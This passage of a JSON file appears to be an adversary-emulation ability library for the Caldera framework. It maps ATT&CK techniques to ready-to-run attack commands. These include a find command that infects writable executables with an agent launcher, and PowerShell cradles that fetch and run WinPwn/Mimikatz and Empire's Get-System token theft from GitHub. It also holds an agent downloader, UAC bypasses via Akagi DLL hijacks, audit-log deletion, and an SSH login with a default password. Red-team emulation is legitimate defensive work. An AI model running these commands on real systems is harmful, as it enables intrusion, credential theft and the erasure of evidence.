                "command": "find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF \"54NDC47_SCRIPT\" \"{}\" || echo \"#54NDC47_SCRIPT\\n\" \"chmod +x sandcat.go-darwin && sandcat.go-darwin\" >> \"{}\"; ls \"{}\" ' \\; | echo \"complete\"",
                "name": "sh",
                "parsers": [],
                "payloads": [
                    "sandcat.go"
                ],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF \"54NDC47_SCRIPT\" \"{}\" || echo \"#54NDC47_SCRIPT\\n\" \"chmod +x sandcat.go-linux && sandcat.go-linux\" >> \"{}\"; ls \"{}\" ' \\; | echo \"complete\"",
                "name": "sh",
                "parsers": [],
                "payloads": [
                    "sandcat.go"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Locate and infect files with weak but executable perms",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Weak executable files",
        "tactic": "privilege-escalation",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "aa758d17faffeeb69c56481340891859",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Reflective Code Loading",
        "technique_id": "T1620",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); mimiload -consoleoutput -noninteractive",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Reflectively load Mimik@tz into memory technique via function of WinPwn",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "WinPwn - Reflectively load Mimik@tz into memory",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "6881a4589710d53f0c146e91db513f01",
        "buckets": [
            "multiple"
        ],
        "privilege": "",
        "technique_name": "Network Sniffing",
        "technique_id": "T1040",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "netsh trace stop >nul 2>&1 && TIMEOUT /T 5 >nul 2>&1 && del %temp%\\trace.etl >nul 2>&1 && del %temp%\\trace.cab >nul 2>&1"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "netsh trace start capture=yes tracefile=%temp%\\trace.etl maxsize=10",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Uses the built-in Windows packet capture\nAfter execution you should find a file named trace.etl and trace.cab in the temp directory",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Windows Internal Packet Capture",
        "tactic": "multiple",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "6623d6925383b47a30d6c7e5e8c4d752",
        "buckets": [
            "multiple"
        ],
        "privilege": "",
        "technique_name": "Network Sniffing",
        "technique_id": "T1040",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "del %TEMP%\\t1040.etl"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "pktmon.exe start --etw  -f %TEMP%\\t1040.etl && TIMEOUT /T 5 >nul 2>&1 && pktmon.exe stop",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Will start a packet capture and store log file as t1040.etl.\nhttps://lolbas-project.github.io/lolbas/Binaries/Pktmon/",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Windows Internal pktmon capture",
        "tactic": "multiple",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "d9c719f978740efa1ed6db8fbc749706",
        "buckets": [
            "multiple"
        ],
        "privilege": "",
        "technique_name": "Network Sniffing",
        "technique_id": "T1040",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "pktmon filter remove"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "pktmon.exe filter add -p 445",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Select Desired ports for packet capture \nhttps://lolbas-project.github.io/lolbas/Binaries/Pktmon/",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Windows Internal pktmon set filter",
        "tactic": "multiple",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "ae73a53476995f46b71f11709f525319",
        "buckets": [
            "multiple"
        ],
        "privilege": "",
        "technique_name": "Access Token Manipulation: Token Impersonation/Theft",
        "technique_id": "T1134.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script uses `SeDebugPrivilege` to obtain, duplicate and impersonate the token of a another process.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "`SeDebugPrivilege` token duplication",
        "tactic": "multiple",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "89955f55-529d-4d58-bed4-fed9e42515ec",
        "buckets": [
            "collection"
        ],
        "privilege": "",
        "technique_name": "Data from Local System",
        "technique_id": "T1005",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "curl #{remote.host.socket}",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "curl #{remote.host.socket}",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "See the raw content of a socket",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "cURL socket address",
        "tactic": "collection",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "55678719-e76e-4df9-92aa-10655bbd1cf4",
        "buckets": [
            "collection"
        ],
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "technique_id": "T1059.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "cmd.exe /c \"net user\" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c \"whoami /priv\" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c \"netstat -ano\" >> C:\\Windows\\temp\\history.log;",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "User enumeration",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "cmd.exe information gathering",
        "tactic": "collection",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "e99cce5c-cb7e-4a6e-8a09-1609a221b90a",
        "buckets": [
            "privilege-escalation"
        ],
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control",
        "technique_id": "T1548.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$wc.Headers.add(\"defaultSleep\",\"60\");\n$wc.Headers.add(\"defaultGroup\",\"bypassed_u_bro\");\n$data=$wc.DownloadData($url);\n$name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\");\n[io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n.\\Akagi64.exe 32 \"C:\\Users\\Public\\$name.exe -server #{server}\"",
                "name": "psh",
                "parsers": [],
                "payloads": [
                    "Akagi64.exe"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "UIPI bypass with uiAccess application",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "duser/osksupport DLL Hijack",
        "tactic": "privilege-escalation",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "0093c0e0-68b6-4cab-b0d4-2b40b3c78f71",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Process Discovery",
        "technique_id": "T1057",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "acrnctl list",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.acrn",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "hypervisor.vm.name",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Enumerate running virtual machines on hypervisor",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "enumerate VMs",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "5f407c31b29d92be4648b3cff37e0abe",
        "buckets": [
            "impact"
        ],
        "privilege": "",
        "technique_name": "Resource Hijacking",
        "technique_id": "T1496",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "yes > /dev/null",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "yes > /dev/null",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This test simulates a high CPU load as you might observe during cryptojacking attacks.\nEnd the test by using CTRL/CMD+C to break.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "macOS/Linux - Simulate CPU Load with Yes",
        "tactic": "impact",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "0e0bf52a7d3c64d3b9c8a6106bf92926",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
        "technique_id": "T1070.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "sudo rm -rf /private/var/log/system.log*; sudo rm -rf /private/var/audit/*",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "sudo rm -rf /private/var/log/system.log*; sudo rm -rf /private/var/audit/*",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Delete system and audit logs\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "rm -rf",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "d05ea71a-be9f-46eb-b9a5-b9e693b268b9",
        "buckets": [],
        "privilege": "",
        "technique_name": "Default Credentials",
        "technique_id": "T0812",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "serverip=$(echo #{server} | awk -F/ '{print $3}' | sed 's/:.*//'); sshpass -p 1234 ssh -o StrictHostKeyChecking=no cobra@$serverip",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {
            "cleanup": "[]"
        },
        "access": {},
        "description": "ssh conenction server to victim",
        "plugin": "",
        "singleton": true,
        "delete_payload": true,
        "name": "ssh connection server",
        "tactic": "lateral-movement",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "8adf02e8-6e71-4244-886c-98c402857404",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Process Discovery",
        "technique_id": "T1057",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "tasklist /m  >> $env:APPDATA\\vmtool.log;\ncat $env:APPDATA\\vmtool.log",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Capture running processes and their loaded DLLs",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "tasklist Process Enumeration",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "53d41aa7edbb10cea4c99df8c2b0862f",
        "buckets": [
            "collection"
        ],
        "privilege": "",
        "technique_name": "Audio Capture",
        "technique_id": "T1123",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "[AudioDeviceCmdlets](https://github.com/cdhunt/WindowsAudioDevice-Powershell-Cmdlet)\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "using device audio capture commandlet",
        "tactic": "collection",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "95ad5d69-563e-477b-802b-4855bfb3be09",
        "buckets": [
            "privilege-escalation"
        ],
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control",
        "technique_id": "T1548.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": ".\\Akagi64.exe 30 C:\\Windows\\System32\\cmd.exe",
                "name": "cmd",
                "parsers": [],
                "payloads": [
                    "Akagi64.exe"
                ],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": ".\\Akagi64.exe 30 C:\\Windows\\System32\\cmd.exe",
                "name": "psh",
                "parsers": [],
                "payloads": [
                    "Akagi64.exe"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "wow64log DLL Hijack",
        "tactic": "privilege-escalation",
        "repeatable": false,
        "requirements": []
    }
]